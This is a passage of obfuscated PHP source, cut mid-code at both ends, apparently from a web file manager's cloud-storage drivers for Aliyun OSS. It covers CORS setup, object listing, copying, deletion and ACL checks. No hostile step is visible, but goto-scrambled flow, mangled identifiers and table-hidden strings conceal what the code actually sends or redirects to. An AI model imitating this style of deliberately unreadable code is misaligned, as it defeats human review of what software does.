$f°ÃÉ…˜Ò[$Eã„¶‡”³Š[$c„·Ø¿¬[180]]]; foreach ($CŠ©Êß–ˆñ as &$B—Éò™—ò—) { $B—Éò™—ò—[$c„·Ø¿¬[455]] = $Eã„¶‡”³Š[$c„·Ø¿¬[455]]; } unset($B—Éò™—ò—); } $e›É‡õÏ¬  = array(); goto aÑÒºèë²; aìÚÑåÉÕ: foreach ($e³ŒÂöÓ¹­ as $Eã„¶‡”³Š) { if (!isset($f°ÃÉ…˜Ò[$Eã„¶‡”³Š[$c„·Ø¿¬[180]]])) { continue; } $Cî¢ˆƒÚãÂ = $f°ÃÉ…˜Ò[$Eã„¶‡”³Š[$c„·Ø¿¬[180]]]; foreach ($Cî¢ˆƒÚãÂ as &$B—Éò™—ò—) { $B—Éò™—ò—[$c„·Ø¿¬[455]] = $Eã„¶‡”³Š[$c„·Ø¿¬[455]]; $B—Éò™—ò—[$c„·Ø¿¬[576]] = !0; } unset($B—Éò™—ò—); } $aÜ­£‘¸ğ® = array(); foreach ($Bˆ¢Ï‚æù as $eÏ‰ªˆ¦‹¬) { if (isset($eÏ‰ªˆ¦‹¬[$c„·Ø¿¬[576]]) && $eÏ‰ªˆ¦‹¬[$c„·Ø¿¬[576]]) { continue; } $a³¬Â†¡£Â = $bÛŞå½™ÀØ->getPathInner($eÏ‰ªˆ¦‹¬[$c„·Ø¿¬[86]]); $e’º“Û®ç¸ = $a†Œ‹éË¤’->addFileMake($a³¬Â†¡£Â, $eÏ‰ªˆ¦‹¬[$c„·Ø¿¬[88]], $eÏ‰ªˆ¦‹¬[$c„·Ø¿¬[181]], $eÏ‰ªˆ¦‹¬[$c„·Ø¿¬[180]], $eÏ‰ªˆ¦‹¬[$c„·Ø¿¬[38]], $b½«Û²Ç‡Æ); $aÜ­£‘¸ğ®[] = $e’º“Û®ç¸; } goto d§óÏóˆó…; aÑÒºèë²: foreach ($Bˆ¢Ï‚æù as $c‚®àÔ’–) { $e›É‡õÏ¬ [$c‚®àÔ’–[$c„·Ø¿¬[38]]] = $c‚®àÔ’–; } return $e›É‡õÏ¬ ; goto dèùÂƒÜÉà; eÜöÛø†õ: $a†Œ‹éË¤’ = Model($c„·Ø¿¬[579]); $e³ŒÂöÓ¹­ = $a†Œ‹éË¤’->where($eÌóà „Ç·)->select(); $e³ŒÂöÓ¹­ = $e³ŒÂöÓ¹­ ? $e³ŒÂöÓ¹­ : array(); goto aìÚÑåÉÕ; dèùÂƒÜÉà: } } goto D¯œõ¢¨ğ; c×ó¶ìÄÅÇ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($d·ÍÏáî¾) { parent::__construct($d·ÍÏáî¾); $this->signatureVersion($_SERVER[£¶ä½¶¢][222]); } public function fileOutLink($D×ŒŠ±Ùå») { $cã¶»¨Ù§É =& $_SERVER[£¶ä½¶¢]; if (substr($D×ŒŠ±Ùå», 0, 7) == $cã¶»¨Ù§É[1201]) { $D×ŒŠ±Ùå» = $cã¶»¨Ù§É[1202] . substr($D×ŒŠ±Ùå», 7); } header($cã¶»¨Ù§É[169] . $D×ŒŠ±Ùå»); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($E‹ôÒô‹éŠ) { parent::__construct(); include_once SDK_DIR . $_SERVER[£¶ä½¶¢][1257]; $this->_init($E‹ôÒô‹éŠ); } public function _init($C˜…Á†é”š) { $CÉ¤ÌŞ¾¹ =& $_SERVER[£¶ä½¶¢]; foreach ($C˜…Á†é”š as $Eù«‰ô´·» => $aÀ‹ š±) { if (isset($this->{$Eù«‰ô´·»})) { $this->{$Eù«‰ô´·»} = $aÀ‹ š±; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($CÉ¤ÌŞ¾¹[1258] . LNG($CÉ¤ÌŞ¾¹[1259])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto bŠñê•„Ô”; F°’İÉìÎ†: $bÀ·ì»ë•ï->setMaxAgeSeconds(600); $bÀ·ì»ë•ï->addExposeHeader($Dí¥ÛÙ¬Á¼[1265]); $bÀ·ì»ë•ï->addAllowedHeader($Dí¥ÛÙ¬Á¼[1260]); goto bÀë¥‰¡ÀĞ; Cƒ†¶ŞéÛ: $bÀ·ì»ë•ï->addAllowedMethod($Dí¥ÛÙ¬Á¼[1263]); $bÀ·ì»ë•ï->addAllowedMethod($Dí¥ÛÙ¬Á¼[1264]); $bÀ·ì»ë•ï->addAllowedMethod($Dí¥ÛÙ¬Á¼[168]); goto F°’İÉìÎ†; CÂéµßÚ·‘: $bÀ·ì»ë•ï->addAllowedOrigin($Dí¥ÛÙ¬Á¼[1260]); $bÀ·ì»ë•ï->addAllowedMethod($Dí¥ÛÙ¬Á¼[1261]); $bÀ·ì»ë•ï->addAllowedMethod($Dí¥ÛÙ¬Á¼[1262]); goto Cƒ†¶ŞéÛ; bŠñê•„Ô”: $Dí¥ÛÙ¬Á¼ =& $_SERVER[£¶ä½¶¢]; $AŒØñ®ñÃ = new OSS\Model\CorsConfig(); $bÀ·ì»ë•ï = new OSS\Model\CorsRule(); goto CÂéµßÚ·‘; bÀë¥‰¡ÀĞ: $AŒØñ®ñÃ->addRule($bÀ·ì»ë•ï); try { $this->client->putBucketCors($this->bucket, $AŒØñ®ñÃ); } catch (OSS\Core\OssException $B®²íĞô¤´) { return !1; } return !0; goto däç…êˆ“®; däç…êˆ“®: } public function getBucketCors() { goto d˜Æ©¼™Ò; eÓêÁáà¢: $cä«—Ì”È = $BªÑöóÆ¸[0]->getMaxAgeSeconds(); $b®¥²ÔØİ¾ = $BªÑöóÆ¸[0]->getExposeHeaders(); $dØ­ñˆí = $BªÑöóÆ¸[0]->getAllowedHeaders(); goto B³Ù‰ë”; EÒ¸Ì¼Ø: if (!$c“„×æ°  || !($BªÑöóÆ¸ = $c“„×æ° ->getRules())) { return null; } $dœ™Ÿ˜ = $BªÑöóÆ¸[0]->getAllowedOrigins(); $e½ÅÇÒáÆ = $BªÑöóÆ¸[0]->getAllowedMethods(); goto eÓêÁáà¢; B³Ù‰ë”: return array($DÒÌÃ²ˆ©¼[191] => isset($dœ™Ÿ˜[0]) ? $dœ™Ÿ˜[0] : $DÒÌÃ²ˆ©¼[43], $DÒÌÃ²ˆ©¼[195] => $e½ÅÇÒáÆ, $DÒÌÃ²ˆ©¼[1266] => $cä«—Ì”È, $DÒÌÃ²ˆ©¼[1267] => isset($b®¥²ÔØİ¾[0]) ? $b®¥²ÔØİ¾[0] : $DÒÌÃ²ˆ©¼[43], $DÒÌÃ²ˆ©¼[193] => isset($dØ­ñˆí[0]) ? $dØ­ñˆí[0] : $DÒÌÃ²ˆ©¼[43]); goto AÄÄ‹åó¯; d˜Æ©¼™Ò: $DÒÌÃ²ˆ©¼ =& $_SERVER[£¶ä½¶¢]; $c“„×æ°  = null; try { $c“„×æ°  = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $E ¸ÖÑø’â) { return null; } goto EÒ¸Ì¼Ø; AÄÄ‹åó¯: } public function isBucketCors() { goto D™”ß˜×‹Ï; EøºÑùÇ: if ($fï÷äİá•Ë[$dÈîÑ™¨…[191]] != $dÈîÑ™¨…[192] || $fï÷äİá•Ë[$dÈîÑ™¨…[193]] != $dÈîÑ™¨…[192]) { return !1; } $F¾êØÜíçÃ = array_map($dÈîÑ™¨…[194], $fï÷äİá•Ë[$dÈîÑ™¨…[195]]); if (!is_array($F¾êØÜíçÃ)) { $F¾êØÜíçÃ = array(); } goto c¯“®ìãŞ; c¯“®ìãŞ: $dó±Â¶ª„ = array($dÈîÑ™¨…[196], $dÈîÑ™¨…[197], $dÈîÑ™¨…[198], $dÈîÑ™¨…[199], $dÈîÑ™¨…[200]); $eºäåÀ†Â = array_diff($dó±Â¶ª„, $F¾êØÜíçÃ); return empty($eºäåÀ†Â); goto B‰‹ßá—ìœ; D™”ß˜×‹Ï: $dÈîÑ™¨… =& $_SERVER[£¶ä½¶¢]; $fï÷äİá•Ë = $this->getBucketCors(); if (!$fï÷äİá•Ë || !is_array($fï÷äİá•Ë)) { return !1; } goto EøºÑùÇ; B‰‹ßá—ìœ: } public function mkfile($EÄÏ®ÇÎ•ô, $a”Î§ìîˆœ = '', $eë­¿³‚Ó = REPEAT_RENAME) { $eˆìÍ÷ìÛó = $this->setContent($EÄÏ®ÇÎ•ô, $a”Î§ìîˆœ); if ($eˆìÍ÷ìÛó !== !1) { return $this->getPathOuter($EÄÏ®ÇÎ•ô); } return !1; } public function mkdir($B•À—‘äÒµ, $cÏˆ‘ÖŒ÷ = REPEAT_SKIP) { if ($this->_isFolder($B•À—‘äÒµ)) { return $this->getPathOuter($B•À—‘äÒµ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($B•À—‘äÒµ)); } catch (OSS\Core\OssException $DÍĞ”£šÍñ) { return !1; } return $this->getPathOuter($B•À—‘äÒµ); } private function fileList($eÏ”¬İé–², $bâ†ÄŒ©ƒÍ = '', $F¾¹šÍã‹‰ = 0) { goto eŸ¹íì¾âì; aº¢©†‹‡„: $E¡Ó´İ½¢™ = $Cñ³¨´“Â’ = array(); while (!0) { check_abort(); $FŒĞä•Ï”Ó = array($bñèƒÆáôƒ[1268] => $bâ†ÄŒ©ƒÍ, $bñèƒÆáôƒ[1269] => $CË÷ÄÎ‰ª÷, $bñèƒÆáôƒ[1270] => $DÛ•ÍËÈçÉ, $bñèƒÆáôƒ[1271] => $CÈŠ¥ÓÅ‚˜); try { $DÕÅÃğŒª¤ = $this->client->listObjects($this->bucket, $FŒĞä•Ï”Ó); } catch (OSS\Core\OssException $bö—×µÌ) { break; } $CÈŠ¥ÓÅ‚˜ = $DÕÅÃğŒª¤->getNextMarker(); $dÚ¤²‚´³ = $DÕÅÃğŒª¤->getObjectList(); $bø¸„„×ì· = $DÕÅÃğŒª¤->getPrefixList(); foreach ($dÚ¤²‚´³ as $DÁµê‘ö­) { goto cˆèßÁ‡¥¹; A‚ØîÔ: $e—™—´øÎ = $DÁµê‘ö­->getLastModified(); $F›¼ÎºãöÍ = $F¾¹šÍã‹‰ ? array($bñèƒÆáôƒ[38] => $b¥¨¸ˆšÃÇ, $bñèƒÆáôƒ[88] => $FøãÒªÚ–Ü, $bñèƒÆáôƒ[207] => strtotime($e—™—´øÎ)) : $b¥¨¸ˆšÃÇ; $CÅÕËèØ¾ = $FøãÒªÚ–Ü == 0 && substr($b¥¨¸ˆšÃÇ, strlen($b¥¨¸ˆšÃÇ) - 1, 1) == $bñèƒÆáôƒ[18] ? !0 : !1; goto A½„™µØÄ÷; cˆèßÁ‡¥¹: if ($DÁµê‘ö­->getKey() == $CË÷ÄÎ‰ª÷) { continue; } $b¥¨¸ˆšÃÇ = $DÁµê‘ö­->getKey(); $FøãÒªÚ–Ü = $DÁµê‘ö­->getSize(); goto A‚ØîÔ; A½„™µØÄ÷: if ($C˜ßåÜã»¼) { $this->cacheMethod($bñèƒÆáôƒ[209], $b¥¨¸ˆšÃÇ, $CÅÕËèØ¾); $this->cacheMethod($bñèƒÆáôƒ[210], $b¥¨¸ˆšÃÇ, array($bñèƒÆáôƒ[88] => $FøãÒªÚ–Ü, $bñèƒÆáôƒ[1272] => $FøãÒªÚ–Ü, $bñèƒÆáôƒ[94] => strtotime($e—™—´øÎ), $bñèƒÆáôƒ[1273] => $e—™—´øÎ)); } if ($CÅÕËèØ¾) { $E¡Ó´İ½¢™[] = $b¥¨¸ˆšÃÇ; continue; } $Cñ³¨´“Â’[] = $F›¼ÎºãöÍ; goto eŠó¿øëÎ; eŠó¿øëÎ: } foreach ($bø¸„„×ì· as $A¦šàôÕ¥²) { $E¡Ó´İ½¢™[] = $A¦šàôÕ¥²->getPrefix(); if ($C˜ßåÜã»¼) { $this->cacheMethod($bñèƒÆáôƒ[209], $b¥¨¸ˆšÃÇ, !0); } } if ($CÈŠ¥ÓÅ‚˜ === $bñèƒÆáôƒ[43]) { break; } } if ($C˜ßåÜã»¼) { $this->cacheMethod($bñèƒÆáôƒ[209], $eÏ”¬İé–², !0); } goto CÈ™ª¸äÁ; eŸ¹íì¾âì: $bñèƒÆáôƒ =& $_SERVER[£¶ä½¶¢]; $eÏ”¬İé–² = trim($eÏ”¬İé–², $bñèƒÆáôƒ[18]); $CË÷ÄÎ‰ª÷ = empty($eÏ”¬İé–²) && $eÏ”¬İé–² !== $bñèƒÆáôƒ[201] ? $bñèƒÆáôƒ[43] : $eÏ”¬İé–² . $bñèƒÆáôƒ[18]; goto céì„£ëíÙ; CÈ™ª¸äÁ: return array($bñèƒÆáôƒ[85] => $E¡Ó´İ½¢™, $bñèƒÆáôƒ[84] => $Cñ³¨´“Â’); goto fäÏ‘÷¹·; céì„£ëíÙ: $CÈŠ¥ÓÅ‚˜ = $bñèƒÆáôƒ[43]; $DÛ•ÍËÈçÉ = 1000; $C˜ßåÜã»¼ = $this->listItemCache === !1 ? !1 : !0; goto aº¢©†‹‡„; fäÏ‘÷¹·: } public function copyFile($C„Œ“ñÙ, $EìšøÁŠ¦°) { $fê‹§æ„õƒ = $this->size($C„Œ“ñÙ); if ($fê‹§æ„õƒ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $C„Œ“ñÙ, $this->bucket, $this->pathEncode($EìšøÁŠ¦°)); } catch (OSS\Core\OssException $e™…ƒÅÎ¶») { return !1; } return $this->getPathOuter($EìšøÁŠ¦°); } $eÛŠì··Üº = $this->multiCopyObject($C„Œ“ñÙ, $EìšøÁŠ¦°, $fê‹§æ„õƒ); return $eÛŠì··Üº ? $this->getPathOuter($EìšøÁŠ¦°) : !1; } private function multiCopyObject($d®Ò¹ˆ§ê¡, $bØå­Î¬îñ, $FÃŒ²ÄÖˆ) { $dÊ¿ôŸËçØ =& $_SERVER[£¶ä½¶¢]; try { goto aïÑºéÓíÂ; AÜ¹É©“öÜ: $BÅ¯º‡Ò¡¸ = 1024 * 1024 * 10; $FïÖ´Å¾ğ = $this->client->generateMultiuploadParts($FÃŒ²ÄÖˆ, $BÅ¯º‡Ò¡¸); foreach ($FïÖ´Å¾ğ as $c­¯°Ş×Õø => $CŞÙ¡ñƒÈ) { $FêéÜÍœè¸ = $fåÕà°¢ºº + (int) $CŞÙ¡ñƒÈ[$dÊ¿ôŸËçØ[1275]]; $EôÖ½©Õ¶› = (int) $CŞÙ¡ñƒÈ[$dÊ¿ôŸËçØ[344]] + $FêéÜÍœè¸ - 1; $càØªÜ„®· = array($dÊ¿ôŸËçØ[1276] => $FêéÜÍœè¸, $dÊ¿ôŸËçØ[1277] => $EôÖ½©Õ¶›); $FŸ¬¿èË[] = $this->client->uploadPartCopy($this->bucket, $d®Ò¹ˆ§ê¡, $this->bucket, $this->pathEncode($bØå­Î¬îñ), $cÙãÆÅ’¶ô, $b¨¯Ş±’Ñ–, $càØªÜ„®·); $cÙãÆÅ’¶ô = $cÙãÆÅ’¶ô + 1; } goto Cˆôô·»¨Ö; D±í„Ãé±ƒ: $cÙãÆÅ’¶ô = 1; $fåÕà°¢ºº = 0; $FŸ¬¿èË = array(); goto AÜ¹É©“öÜ; Cˆôô·»¨Ö: $fáÑ™»¦  = array(); foreach ($FŸ¬¿èË as $c­¯°Ş×Õø => $A‰¸ñˆ¢ö) { $fáÑ™»¦ [] = array($dÊ¿ôŸËçØ[1278] => $c­¯°Ş×Õø + 1, $dÊ¿ôŸËçØ[1279] => $A‰¸ñˆ¢ö); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($bØå­Î¬îñ), $b¨¯Ş±’Ñ–, $fáÑ™»¦ ); goto Eˆ³Ï‡´›õ; aïÑºéÓíÂ: $bß¿¶õ„İ = array(); if ($DğÊ…ì¹…¦ = $this->hashMd5($d®Ò¹ˆ§ê¡)) { $bß¿¶õ„İ = array(OSS\OssClient::OSS_HEADERS => array($dÊ¿ôŸËçØ[1274] => $DğÊ…ì¹…¦)); } $b¨¯Ş±’Ñ– = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($bØå­Î¬îñ), $bß¿¶õ„İ); goto D±í„Ãé±ƒ; Eˆ³Ï‡´›õ: } catch (OSS\Core\OssException $a±ĞÆ¿öÌ£) { return !1; } return !0; } public function moveFile($b’İ¨×”¿, $CÂ™Áˆšá²) { if ($this->copyFile($b’İ¨×”¿, $CÂ™Áˆšá²)) { $this->remove($b’İ¨×”¿); return $this->getPathOuter($CÂ™Áˆšá²); } return !1; } public function delFile($cäÙ°ˆ“¾) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($cäÙ°ˆ“¾)); } catch (OSS\Core\OssException $A¸ÏÛ¶¯áÖ) { return !1; } return !0; } public function delFolder($aé¸è¯‡é) { goto bÚòƒö¸´ˆ; AˆÙ³ù‹İ: $E«µ­³äòÅ = $this->fileList($aé¸è¯‡é); $this->listItemCache = !0; $A’µçÍó  = trim($aé¸è¯‡é, $c¿…ìö©ƒ²[18]) . $c¿…ìö©ƒ²[18]; goto b÷î´åÑĞÌ; AÈ¢¶‹Û–: $EÂçÚô„Š = $this->delByBatch($E«µ­³äòÅ[$c¿…ìö©ƒ²[85]]); if (!$EÂçÚô„Š) { return !1; } return $this->delFile($A’µçÍó ); goto CÆ—ÜÆ™©É; bÚòƒö¸´ˆ: $c¿…ìö©ƒ² =& $_SERVER[£¶ä½¶¢]; if (!$this->exist($aé¸è¯‡é)) { return !0; } $this->listItemCache = !1; goto AˆÙ³ù‹İ; b÷î´åÑĞÌ: if (!empty($aé¸è¯‡é) && $aé¸è¯‡é !== $c¿…ìö©ƒ²[201] && !in_array($A’µçÍó , $E«µ­³äòÅ[$c¿…ìö©ƒ²[85]])) { $E«µ­³äòÅ[$c¿…ìö©ƒ²[85]][] = $A’µçÍó ; } $EÂçÚô„Š = $this->delByBatch($E«µ­³äòÅ[$c¿…ìö©ƒ²[84]]); if (!$EÂçÚô„Š) { return !1; } goto AÈ¢¶‹Û–; CÆ—ÜÆ™©É: } private function delByBatch($DãªÓë”†) { foreach (array_chunk($DãªÓë”†, 1000) as $D‘Üˆ¤äñ¡) { try { $this->client->deleteObjects($this->bucket, $D‘Üˆ¤äñ¡); } catch (OSS\Core\OssException $AÃÏ¶–šÅ™) { return !1; } } return !0; } public function rename($A®‰‘Şåí, $E¦èè…ãØ) { return $this->renameObject($A®‰‘Şåí, $E¦èè…ãØ); } private function fileInfo($e©¹Š¶Ñ±, $DƒŞÃÃŒĞÒ = false, $BÜÁ””„ä† = array()) { goto f²ŞÚß±¿; A³ÕÀï¤éˆ: return $cçõğ™Õó; goto DÕ»ç›Ì; f²ŞÚß±¿: $F¢‰øÑŸ =& $_SERVER[£¶ä½¶¢]; $cçõğ™Õó = array($F¢‰øÑŸ[38] => $this->pathThis($e©¹Š¶Ñ±), $F¢‰øÑŸ[86] => $this->getPathOuter($e©¹Š¶Ñ±), $F¢‰øÑŸ[39] => $F¢‰øÑŸ[203], $F¢‰øÑŸ[88] => isset($BÜÁ””„ä†[$F¢‰øÑŸ[88]]) ? $BÜÁ””„ä†[$F¢‰øÑŸ[88]] : 0, $F¢‰øÑŸ[178] => $this->ext($e©¹Š¶Ñ±)); if ($DƒŞÃÃŒĞÒ) { return $cçõğ™Õó; } goto b²ôù¥„ä–; b²ôù¥„ä–: $cçõğ™Õó[$F¢‰øÑŸ[204]] = $cçõğ™Õó[$F¢‰øÑŸ[94]] = 0; $cçõğ™Õó[$F¢‰øÑŸ[205]] = $cçõğ™Õó[$F¢‰øÑŸ[206]] = !0; if (empty($BÜÁ””„ä†)) { $eíà²ÒÅ½ = $this->objectMeta($e©¹Š¶Ñ±); if (!$eíà²ÒÅ½) { return $cçõğ™Õó; } $BÜÁ””„ä† = array($F¢‰øÑŸ[94] => strtotime($eíà²ÒÅ½[$F¢‰øÑŸ[1273]]), $F¢‰øÑŸ[88] => $eíà²ÒÅ½[$F¢‰øÑŸ[1272]] + 0); } goto CèÆ‰Â“ÀÄ; CèÆ‰Â“ÀÄ: if (isset($BÜÁ””„ä†[$F¢‰øÑŸ[88]])) { $cçõğ™Õó[$F¢‰øÑŸ[88]] = $BÜÁ””„ä†[$F¢‰øÑŸ[88]]; } if (isset($BÜÁ””„ä†[$F¢‰øÑŸ[94]])) { $cçõğ™Õó[$F¢‰øÑŸ[94]] = $BÜÁ””„ä†[$F¢‰øÑŸ[94]]; } if (isset($BÜÁ””„ä†[$F¢‰øÑŸ[207]]) && !trim($cçõğ™Õó[$F¢‰øÑŸ[94]])) { $cçõğ™Õó[$F¢‰øÑŸ[94]] = $BÜÁ””„ä†[$F¢‰øÑŸ[207]]; } goto A³ÕÀï¤éˆ; DÕ»ç›Ì: } private function folderInfo($bÚ½Ö“¨Ü, $dŠ¹”š¶ö = false, $fÀ’¸›â› = array()) { goto EÄİõË¾·; dˆ”å›ƒ„: $cùîåæ­ò[$bß±³øÓç[204]] = $cùîåæ­ò[$bß±³øÓç[94]] = 0; $cùîåæ­ò[$bß±³øÓç[205]] = $cùîåæ­ò[$bß±³øÓç[206]] = !0; if (empty($fÀ’¸›â›)) { $bÚ½Ö“¨Ü = rtrim($bÚ½Ö“¨Ü, $bß±³øÓç[18]) . $bß±³øÓç[18]; $C˜Ñ²œ¸ù¼ = $this->objectMeta($bÚ½Ö“¨Ü); if (!$C˜Ñ²œ¸ù¼) { return $cùîåæ­ò; } $fÀ’¸›â› = array($bß±³øÓç[204] => $C˜Ñ²œ¸ù¼[$bß±³øÓç[1280]][$bß±³øÓç[1281]], $bß±³øÓç[94] => strtotime($C˜Ñ²œ¸ù¼[$bß±³øÓç[1273]])); } goto D˜–ÉÁ¼£Ø; D˜–ÉÁ¼£Ø: if (isset($fÀ’¸›â›[$bß±³øÓç[94]])) { $cùîåæ­ò[$bß±³øÓç[94]] = $fÀ’¸›â›[$bß±³øÓç[94]]; } if (isset($fÀ’¸›â›[$bß±³øÓç[204]])) { $cùîåæ­ò[$bß±³øÓç[204]] = $fÀ’¸›â›[$bß±³øÓç[204]]; } return $cùîåæ­ò; goto C‡Ëê—µ‚‹; EÄİõË¾·: $bß±³øÓç =& $_SERVER[£¶ä½¶¢]; $cùîåæ­ò = array($bß±³øÓç[38] => $this->pathThis($bÚ½Ö“¨Ü), $bß±³øÓç[86] => $this->getPathOuter($bß±³øÓç[18] . $bÚ½Ö“¨Ü), $bß±³øÓç[39] => $bß±³øÓç[87]); if ($dŠ¹”š¶ö) { return $cùîåæ­ò; } goto dˆ”å›ƒ„; C‡Ëê—µ‚‹: } public function listPath($f»†Ê„ÅØé, $DœŒù†Ÿš¶ = false) { $B¨ÜÒÃµ–ª =& $_SERVER[£¶ä½¶¢]; $d‰ïé™ƒÈË = $this->fileList($f»†Ê„ÅØé, $B¨ÜÒÃµ–ª[18], !0); foreach ($d‰ïé™ƒÈË[$B¨ÜÒÃµ–ª[85]] as $bÒ•¬¶å­µ => $e¤çåçÅ½) { $d‰ïé™ƒÈË[$B¨ÜÒÃµ–ª[85]][$bÒ•¬¶å­µ] = $this->folderInfo($e¤çåçÅ½, $DœŒù†Ÿš¶, $e¤çåçÅ½); } foreach ($d‰ïé™ƒÈË[$B¨ÜÒÃµ–ª[84]] as $bÒ•¬¶å­µ => $e¤çåçÅ½) { $d‰ïé™ƒÈË[$B¨ÜÒÃµ–ª[84]][$bÒ•¬¶å­µ] = $this->fileInfo($e¤çåçÅ½[$B¨ÜÒÃµ–ª[38]], $DœŒù†Ÿš¶, $e¤çåçÅ½); } return $d‰ïé™ƒÈË; } public function has($a¬…Íß˜ò, $D§ÛÓ×‰†ä = false, $a“ó§–Óå = true) { goto e¯¼¼ˆ•‡¦; Bê¶§†Æ¹: $dï¾ŞôÏ‡é = $AğÎº›¼•“[43]; $a¥‹…‡óãŠ = 500; $E«Ô´Ş = $EŠñ‰Ë£ã = 0; goto a¥°ˆÏÄ³; a¥°ˆÏÄ³: while (!0) { check_abort(); $FÄˆ•Æç÷ = array($AğÎº›¼•“[1268] => $AğÎº›¼•“[18], $AğÎº›¼•“[1269] => $Bë¾é“ŸÔ, $AğÎº›¼•“[1270] => $a¥‹…‡óãŠ, $AğÎº›¼•“[1271] => $dï¾ŞôÏ‡é); try { $bë—ğ§Ô•® = $this->client->listObjects($this->bucket, $FÄˆ•Æç÷); } catch (OSS\Core\OssException $Bİ×¾ĞùˆÆ) { break; } $dï¾ŞôÏ‡é = $bë—ğ§Ô•®->getNextMarker(); $Cß´À®ÓÊ = $bë—ğ§Ô•®->getObjectList(); $C­ÃèÆŸ‡— = $bë—ğ§Ô•®->getPrefixList(); if ($D§ÛÓ×‰†ä) { if (count($Cß´À®ÓÊ) > 1 || count($Cß´À®ÓÊ) == 1 && $Cß´À®ÓÊ[0]->getKey() != $Bë¾é“ŸÔ) { $E«Ô´Ş += count($Cß´À®ÓÊ) - 1; } if (!empty($C­ÃèÆŸ‡—)) { $EŠñ‰Ë£ã += count($C­ÃèÆŸ‡—); } if ($dï¾ŞôÏ‡é === $AğÎº›¼•“[43]) { break; } continue; } if ($a“ó§–Óå) { if (!empty($Cß´À®ÓÊ)) { if (count($Cß´À®ÓÊ) > 1 || $Cß´À®ÓÊ[0]->getKey() != $Bë¾é“ŸÔ) { return !0; } } } else { if (!empty($C­ÃèÆŸ‡—)) { return !0; } } if ($dï¾ŞôÏ‡é === $AğÎº›¼•“[43]) { break; } } if ($D§ÛÓ×‰†ä) { return array($AğÎº›¼•“[213] => $E«Ô´Ş, $AğÎº›¼•“[214] => $EŠñ‰Ë£ã); } return !1; goto cÃ„êÒ¾¼; e¯¼¼ˆ•‡¦: $AğÎº›¼•“ =& $_SERVER[£¶ä½¶¢]; $a¬…Íß˜ò = trim($a¬…Íß˜ò, $AğÎº›¼•“[18]); $Bë¾é“ŸÔ = empty($a¬…Íß˜ò) && $a¬…Íß˜ò !== $AğÎº›¼•“[201] ? $AğÎº›¼•“[43] : $a¬…Íß˜ò . $AğÎº›¼•“[18]; goto Bê¶§†Æ¹; cÃ„êÒ¾¼: } public function listAll($BÎ–ÚƒÆÀ¹) { $a†‹•¯ØíÃ =& $_SERVER[£¶ä½¶¢]; $fäÔº‘×•Á = $this->fileList($BÎ–ÚƒÆÀ¹, $a†‹•¯ØíÃ[43], !0); $a¸¤¦ò¬ŠŞ = array(); foreach ($fäÔº‘×•Á[$a†‹•¯ØíÃ[84]] as $bë Ó³Ğ°¹) { $a¸¤¦ò¬ŠŞ[$bë Ó³Ğ°¹[$a†‹•¯ØíÃ[38]]] = $bë Ó³Ğ°¹[$a†‹•¯ØíÃ[88]]; } foreach ($fäÔº‘×•Á[$a†‹•¯ØíÃ[85]] as $bë Ó³Ğ°¹) { if (is_string($bë Ó³Ğ°¹)) { $a¸¤¦ò¬ŠŞ[$bë Ó³Ğ°¹] = 0; } } return $this->listAllFiles($BÎ–ÚƒÆÀ¹, array_keys($a¸¤¦ò¬ŠŞ), $a¸¤¦ò¬ŠŞ); } public function canRead($cÓÜß«¨) { $Fº·¼îƒÛÑ =& $_SERVER[£¶ä½¶¢]; $Cƒñ÷’ˆ¼ = $this->pathAcl($cÓÜß«¨); return $Cƒñ÷’ˆ¼ == $Fº·¼îƒÛÑ[1282] || $Cƒñ÷’ˆ¼ == $Fº·¼îƒÛÑ[527] ? !0 : !1; } public function canWrite($EÅÙíÒË¯Š) { $a„åà †¡æ = $this->pathAcl($EÅÙíÒË¯Š); return $a„åà †¡æ == $_SERVER[£¶ä½¶¢][527] ? !0 : !1; } public function pathAcl($Ağ‹ÓİïÀ) { goto aÏŒíÅ—; aÏŒíÅ—: $a–‰¬‚ë‹£ =& $_SERVER[£¶ä½¶¢]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $F§Ï’Ìªƒ¶ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Ağ‹ÓİïÀ)); } catch (OSS\Core\OssException $c‡•¨›Öî‡) { return !1; } goto aäÀÒµğ¥¾; eßªçâÄ­: return $b–¢ğç‚¨; goto CŸŸ ëÁƒ½; aäÀÒµğ¥¾: $b–¢ğç‚¨ = $F§Ï’Ìªƒ¶ == $a–‰¬‚ë‹£[44] ? $this->bucketAcl : $F§Ï’Ìªƒ¶; if ($b–¢ğç‚¨ == $a–‰¬‚ë‹£[1283]) { return $a–‰¬‚ë‹£[1282]; } if ($b–¢ğç‚¨ == $a–‰¬‚ë‹£[1284]) { return $a–‰¬‚ë‹£[527]; } goto eßªçâÄ­; CŸŸ ëÁƒ½: } private function chmodPath($b¾º·ç›×Ì, $a‡—¥ÄÓÕ˜ = '') { $c™òŸÊ¿îÇ =& $_SERVER[£¶ä½¶¢]; $fòÕ£» Ì = empty($a‡—¥ÄÓÕ˜) ? $c™òŸÊ¿îÇ[1284] : $a‡—¥ÄÓÕ˜; $b„Ÿêô¾¡ = array($c™òŸÊ¿îÇ[44], $c™òŸÊ¿îÇ[202], $c™òŸÊ¿îÇ[1283], $c™òŸÊ¿îÇ[1284]); if (!in_array($fòÕ£» Ì, $b„Ÿêô¾¡)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($b¾º·ç›×Ì), $fòÕ£» Ì); } catch (OSS\Core\OssException $dßƒŒ÷ìš·) { return !1; } return !0; } public function getContent($f„¥ÕÍ©³á) { return $this->fileSubstr($f„¥ÕÍ©³á, -1); } public function setContent($EêİŞ¾òÄ›, $B†‰ºÑøëö = '') { $ağ˜„ì“İğ =& $_SERVER[£¶ä½¶¢]; try { $bÑ£”Ñ–¿× = 